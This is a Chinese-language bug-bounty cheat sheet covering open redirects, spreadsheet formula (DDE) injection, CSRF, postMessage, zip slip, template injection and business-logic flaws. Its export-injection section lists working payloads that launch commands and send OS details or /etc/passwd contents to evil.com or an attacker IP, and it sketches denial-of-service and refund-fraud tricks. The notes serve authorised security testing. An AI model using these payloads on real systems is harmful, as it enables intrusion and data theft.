挖掘思路
========================================

SRC主流漏洞
---------------------------------------
+ 业务逻辑
+ XSS
+ 越权
+ 信息泄露
+ SSRF
+ sql
+ 其它


开放重定位漏洞
----------------------------------------
+ 类型
    - url参数：如 ``login?next=http://example.com``
    - referer参数
+ 场景： 登录，注册，注销等
+ 挖掘方法
    - google语法： ``inurl:%3Dhttp site:example.com``
    - google语法： ``inurl:%3D%2F site:example.com``
+ 绕过技巧
    - 可利用不同浏览器的特性，构造一些非常规的url，具体方法再研究。
    - ``/some/path`` => ``//evil.com``
    - ``/some/path`` => ``/\evil.com``

文件导出（execl）
----------------------------------------
+ 标题姓名地址填写payload： ``=1+1``，查看导出的execl文件中标题是否变成 ``2`` 。
+ payload: ``=AND(2>1)``，查看导出的execl文件中是否显示 ``TRUE`` 。
+ DDE注入：
    ::
        
        =cmd|' /C calc'!A0
        -1+1+cmd|'/C calc'!A0
        %0A=cmd|'/C calc'!A0
        =DDE("cmd";"/C calc";"!A0")A0
        =EXEC("calc.exe")
        =AND(1>2)
        =AND(1<2)
        =1+1
        =INFO("osversion")
        =INFO("directory")
        =INFO("system")
        =INFO("release")
        =INFO("numfile")
        =INFO("memused")
        =HYPERLINK("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "点我")
        
        Google Sheets:
        =IMPORTXML("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "//a")
        =IMPORTDATA("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")))
        =IMPORTHTML("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")), "table", 1)
        =IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
        =IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
        =IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
        
        linux下的payload：
        =SHELL("whoami > /tmp/test.txt")
        =WEBSERVICE("http://evil.com/steal?d="&ENCODEURL(INFO("osversion")))
        ='file:///etc/passwd'#$passwd.A1
        =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))

        #VALUE!	或 #N/A ：公式执行了，但执行失败。
        #NAME?	：函数不存在或被禁用。

CSRF
----------------------------------------
+ 常见CSRF点
    - 修改头像、修改密码、修改邮箱、修改手机号、修改支付密码、添加收货地址、删除收货地址、添加银行卡、删除银行卡、发起转账、发起支付、发起提现等。
+ 修改图像
    - 通过修改图像的URL地址为恶意的CSRF地址，从而实现蠕虫式传播。
    - 有同源策略：调用站内功能，如注销，修改密码等。
    - 无同源策略：cookie外带等。
+ 账号绑定
    - 通过账号绑定功能（GET请求直接发送URL/POST请求可以生成以html网页），将绑定URL发送给受害者，当受害者点击后就将自己的SSO账号（如微信，百度等）绑定到了受害者账号。
+ 账号锁死
+ json格式跨域的两种情况
    - 没有严格校验Content-Type头：application/json，导致CSRF攻击。
    - 存在cors配置不当：允许任意域名访问，导致CSRF攻击。
+ postMessage
    - 判断页面是否接受消息
        + 发送消息到当前页面
            ::
                
                window.postMessage('Hello from test', '*');
        + 发送消息到iframe中的页面
            ::

                var iframe = document.querySelector('iframe');
                iframe.contentWindow.postMessage('Hello from test', '*');
                检查iframe的sandbox 属性，如果 iframe 元素包含 sandbox 属性，并且没有 allow-scripts 或 allow-same-origin，则它会限制跨域 postMessage 的功能。

        + 源码查看
            - 检查源代码查看 ``postMessage`` 调用
        + 如果 Access-Control-Allow-Origin 头的值是 * 或者包含了你的来源，则说明目标页面可能支持跨域通信。
    - 测试跨域通信
        + 打开 www.example1.com 页面，控制台输入
            ::

                var iframe = document.createElement('iframe');
                iframe.src = 'https://www.example2.com';
                document.body.appendChild(iframe);
                iframe.onload = function() {
                iframe.contentWindow.postMessage('Hello from example1', 'https://www.example2.com');
                };
        + 在 www.example2.com 页面中，添加监听 postMessage 的代码
            ::

                window.addEventListener('message', function(event) {
                if (event.origin === 'https://www.example1.com') {
                    console.log('Received message from example1:', event.data);
                }
                }, false);
        + 如果 www.example2.com 页面正确接收了消息并在控制台打印了消息，则说明 postMessage 允许跨域通信。

zip slip
----------------------------------------
+ 场景：上传zip文件，解压后覆盖服务器上的文件。
+ 如：构造 包含 ``../../../../../../../../../../../var/www/html/index.php`` 的zip文件，上传后解压，覆盖服务器上的index.php文件。

信息泄露
----------------------------------------
+ 修改请求包 Accept 头部字段为 ``application/json``，查看是否有敏感信息泄露。
+ 修改请求包 Accept 头部字段为 ``application/xml``，查看是否有敏感信息泄露。

模版注入
----------------------------------------
+ payload: ``${7*7}, {{7*7}}, <%= 7*7 %> ,test+(${{7*7}})@qq.com``
+ 注入点： ``User-Agent、Referer、表单数据、URL参数、JSON请求体、邮箱等``

客服系统
----------------------------------------
+ xss漏洞：通过客服系统发送xss链接，管理员点击后获取管理员权限。
+ 越权查看别人的聊天记录：通过修改参数获取其他用户的聊天记录。
+ 文件上传漏洞：通过客服系统上传恶意文件，获取服务器权限。

内嵌游戏
----------------------------------------
+ 场景：app，小程序，web里面内嵌的小游戏，可能是第三方开发的，但是通过玩游戏能获取积分，经验值，排名等奖励。

转盘抽奖
----------------------------------------
+ 并发
+ 替换抽取的商品

答题闯关
----------------------------------------
+ 跳关
+ 泄露答案
+ 泄露题库
+ 注：漏洞收取的关键比如积分，排名，经验值，奖励等。

在线社区
----------------------------------------
+ 信息泄露
+ 溯源匿名用户
+ 发布内容，编辑器，打XSS

门户网站
----------------------------------------
+ 敏感信息泄露
+ 接口未授权：路径爆破

其它逻辑漏洞
----------------------------------------
+ **未授权接口寻找** ：通过FUZZ、405改请求方法、5xx错误寻找未授权接口。
+ **403 Bypass** ：通过FUZZ爆破次级目录或403 Bypass绕过限制。
+ **虚假锁定** ：账号锁定后，通过输入正确密码是否可登录判断。
+ **输入校验过滤不严** ：导致二次注入、二次XSS。
+ **DDOS攻击** ：通过修改查询范围，拉满处理能力，达到拒绝服务效果。
+ **前端数据截图伪造** ：通过前端数据截图伪造与水平越权数据泄露的组合，实现退款欺骗。
+ **自动填充手机号等**: 页面自动填充手机号，可能是通过cookie中的id进行自动查询获取的。

如何嫖洞
----------------------------------------
+ 越权
    - 一个网站一个功能存在越权，说明这个网站的权限设计就有问题，继续找其他功能点的越权。
+ SQL注入
    - 不同的注入点，不同的参数
    - 不同的url和路径
+ XSS
    - 不同的框，分开提交
+ 小程序，h5，web端
    - 小程序的url放在web访问
    - test.abc.com => h5.test.abc.com
    - 其它子域名：如在hunter上搜索 相关标题


